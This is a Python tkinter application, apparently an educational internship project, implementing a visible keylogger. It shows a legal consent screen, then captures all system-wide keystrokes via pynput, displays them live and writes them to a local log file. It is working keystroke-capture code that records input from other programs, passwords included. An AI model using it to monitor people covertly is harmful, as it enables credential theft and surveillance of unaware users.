import tkinter as tk
from tkinter import scrolledtext, messagebox, filedialog
import threading
from pynput import keyboard
from datetime import datetime
import os

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Educational Keylogger - ProDigy Infotech")
        self.root.geometry("700x600")
        self.root.resizable(True, True)
        
        # Keylogger state
        self.listener = None
        self.is_logging = False
        self.log_file = "keystrokes.log"
        self.keystroke_buffer = []
        
        # Setup GUI components
        self.setup_consent_frame()
        self.consent_given = False
        
    def setup_consent_frame(self):
        """Setup consent screen first"""
        self.consent_frame = tk.Frame(self.root, bg='#f0f0f0')
        self.consent_frame.pack(fill=tk.BOTH, expand=True)
        
        # Warning message
        warning_label = tk.Label(
            self.consent_frame, 
            text="⚠️ ETHICAL AND LEGAL WARNING ⚠️", 
            font=("Arial", 16, "bold"),
            fg="red",
            bg='#f0f0f0'
        )
        warning_label.pack(pady=20)
        
        consent_text = """
This program records keyboard keystrokes.

By using this software, you confirm that:
• You own this device OR have explicit written permission
• You are using this for legitimate educational purposes
• You will not use this to monitor others without their knowledge
• You understand that unauthorized keylogging is ILLEGAL
• You accept full responsibility for how you use this tool

UNAUTHORIZED USE MAY VIOLATE:
• Computer Fraud and Abuse Act (CFAA)
• General Data Protection Regulation (GDPR)
• Various state and international cybercrime laws

Press "I AGREE" only if you understand and accept these terms.
        """
        
        text_area = tk.Text(self.consent_frame, height=15, width=70, wrap=tk.WORD, bg='white')
        text_area.pack(pady=10, padx=20)
        text_area.insert(tk.END, consent_text)
        text_area.config(state=tk.DISABLED)
        
        button_frame = tk.Frame(self.consent_frame, bg='#f0f0f0')
        button_frame.pack(pady=10)
        
        agree_btn = tk.Button(
            button_frame, 
            text="✓ I AGREE (Ethical Use Only)", 
            command=self.grant_consent,
            bg="green", 
            fg="white",
            font=("Arial", 12, "bold"),
            padx=20,
            pady=5
        )
        agree_btn.pack(side=tk.LEFT, padx=10)
        
        disagree_btn = tk.Button(
            button_frame, 
            text="✗ I DISAGREE (Exit)", 
            command=self.root.quit,
            bg="red", 
            fg="white",
            font=("Arial", 12, "bold"),
            padx=20,
            pady=5
        )
        disagree_btn.pack(side=tk.LEFT, padx=10)
    
    def grant_consent(self):
        """User has given consent, setup main interface"""
        self.consent_given = True
        self.consent_frame.destroy()
        self.setup_main_interface()
        
    def setup_main_interface(self):
        """Create the main application interface"""
        # Main container
        main_frame = tk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Title
        title_label = tk.Label(
            main_frame, 
            text="Educational Keylogger - Authorized Use Only", 
            font=("Arial", 14, "bold"),
            fg="blue"
        )
        title_label.pack(pady=5)
        
        # Control buttons frame
        control_frame = tk.Frame(main_frame)
        control_frame.pack(pady=10)
        
        self.start_btn = tk.Button(
            control_frame, 
            text="▶ START LOGGING", 
            command=self.start_keylogger,
            bg="green", 
            fg="white",
            font=("Arial", 10, "bold"),
            padx=15,
            pady=5,
            state=tk.NORMAL
        )
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = tk.Button(
            control_frame, 
            text="⏹ STOP LOGGING", 
            command=self.stop_keylogger,
            bg="red", 
            fg="white",
            font=("Arial", 10, "bold"),
            padx=15,
            pady=5,
            state=tk.DISABLED
        )
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Status label
        self.status_label = tk.Label(
            main_frame, 
            text="Status: STOPPED", 
            font=("Arial", 10, "italic"),
            fg="red"
        )
        self.status_label.pack(pady=5)
        
        # Log display area
        display_label = tk.Label(main_frame, text="Live Keystroke Display:", font=("Arial", 10, "bold"))
        display_label.pack(anchor=tk.W, pady=(10, 0))
        
        self.log_display = scrolledtext.ScrolledText(
            main_frame, 
            height=15, 
            width=80, 
            wrap=tk.WORD,
            font=("Courier", 9)
        )
        self.log_display.pack(pady=5, fill=tk.BOTH, expand=True)
        
        # File management frame
        file_frame = tk.Frame(main_frame)
        file_frame.pack(pady=10)
        
        self.file_label = tk.Label(
            file_frame, 
            text=f"Log File: {self.log_file}", 
            font=("Arial", 9),
            fg="gray"
        )
        self.file_label.pack(side=tk.LEFT, padx=5)
        
        change_file_btn = tk.Button(
            file_frame, 
            text="Change Log File", 
            command=self.change_log_file,
            font=("Arial", 8)
        )
        change_file_btn.pack(side=tk.LEFT, padx=5)
        
        view_file_btn = tk.Button(
            file_frame, 
            text="Open Log File", 
            command=self.open_log_file,
            font=("Arial", 8)
        )
        view_file_btn.pack(side=tk.LEFT, padx=5)
        
        clear_display_btn = tk.Button(
            file_frame, 
            text="Clear Display", 
            command=self.clear_display,
            font=("Arial", 8)
        )
        clear_display_btn.pack(side=tk.LEFT, padx=5)
        
        # Instructions
        info_label = tk.Label(
            main_frame, 
            text="Press 'ESC' key to stop logging (alternative to STOP button)", 
            font=("Arial", 8, "italic"),
            fg="gray"
        )
        info_label.pack(pady=5)
        
        # Bind window close event
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
    
    def change_log_file(self):
        """Change the log file destination"""
        file_path = filedialog.asksaveasfilename(
            defaultextension=".log",
            filetypes=[("Log files", "*.log"), ("Text files", "*.txt"), ("All files", "*.*")]
        )
        if file_path:
            self.log_file = file_path
            self.file_label.config(text=f"Log File: {self.log_file}")
            self.update_display(f"[INFO] Log file changed to: {self.log_file}\n")
    
    def open_log_file(self):
        """Open the log file in default text editor"""
        if os.path.exists(self.log_file):
            os.startfile(self.log_file)  # Windows
            # For cross-platform: import subprocess; subprocess.call(['open', self.log_file]) on Mac
        else:
            messagebox.showinfo("Info", f"Log file not created yet: {self.log_file}")
    
    def clear_display(self):
        """Clear the display area"""
        self.log_display.delete(1.0, tk.END)
    
    def update_display(self, text):
        """Add text to the display area"""
        self.log_display.insert(tk.END, text)
        self.log_display.see(tk.END)  # Auto-scroll
    
    def log_to_file(self, key_info):
        """Write keystroke to file and display"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {key_info}\n"
        
        # Write to file
        try:
            with open(self.log_file, "a", encoding='utf-8') as f:
                f.write(log_entry)
        except Exception as e:
            print(f"Error writing to file: {e}")
        
        # Update GUI display
        self.root.after(0, self.update_display, log_entry)
    
    def on_press(self, key):
        """Handle key press events"""
        if not self.is_logging:
            return
        
        try:
            # Regular keys
            if hasattr(key, 'char') and key.char is not None:
                if key.char == ' ':
                    self.log_to_file("[SPACE]")
                else:
                    self.log_to_file(key.char)
            else:
                # Special keys
                special_map = {
                    keyboard.Key.enter: "[ENTER]\n",
                    keyboard.Key.tab: "[TAB]",
                    keyboard.Key.backspace: "[BACKSPACE]",
                    keyboard.Key.space: "[SPACE]",
                    keyboard.Key.shift: "[SHIFT]",
                    keyboard.Key.ctrl_l: "[CTRL]",
                    keyboard.Key.ctrl_r: "[CTRL]",
                    keyboard.Key.alt_l: "[ALT]",
                    keyboard.Key.alt_r: "[ALT]",
                    keyboard.Key.cmd: "[WIN]",
                    keyboard.Key.up: "[UP]",
                    keyboard.Key.down: "[DOWN]",
                    keyboard.Key.left: "[LEFT]",
                    keyboard.Key.right: "[RIGHT]",
                    keyboard.Key.esc: "[ESC]",
                }
                key_name = special_map.get(key, f"[{str(key)}]")
                self.log_to_file(key_name)
                
        except Exception as e:
            self.log_to_file(f"[ERROR: {e}]")
    
    def on_release(self, key):
        """Handle key release - stop on ESC"""
        if key == keyboard.Key.esc and self.is_logging:
            self.root.after(0, self.stop_keylogger)
        return True  # Keep listening until stopped
    
    def start_keylogger(self):
        """Start the keylogger in a separate thread"""
        if not self.consent_given:
            messagebox.showwarning("Consent Required", "You must accept the ethical terms first!")
            return
        
        if self.is_logging:
            return
        
        self.is_logging = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.status_label.config(text="Status: RUNNING - Logging keystrokes", fg="green")
        
        # Start listener in background thread
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.daemon = True
        self.listener.start()
        
        # Log start event
        start_msg = f"\n{'='*50}\nKEYLOGGER STARTED at {datetime.now()}\n{'='*50}\n"
        self.log_to_file(start_msg.strip())
        
        self.update_display("\n✅ KEYLOGGER STARTED - Press ESC or click STOP to end\n")
    
    def stop_keylogger(self):
        """Stop the keylogger"""
        if not self.is_logging:
            return
        
        self.is_logging = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status_label.config(text="Status: STOPPED", fg="red")
        
        # Log stop event
        stop_msg = f"\n{'='*50}\nKEYLOGGER STOPPED at {datetime.now()}\n{'='*50}\n"
        self.log_to_file(stop_msg.strip())
        
        self.update_display("\n⏹ KEYLOGGER STOPPED\n")
    
    def on_closing(self):
        """Handle window close event"""
        if self.is_logging:
            if messagebox.askokcancel("Quit", "Keylogger is still running. Stop and quit?"):
                self.stop_keylogger()
                self.root.destroy()
        else:
            self.root.destroy()

# Run the application
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()
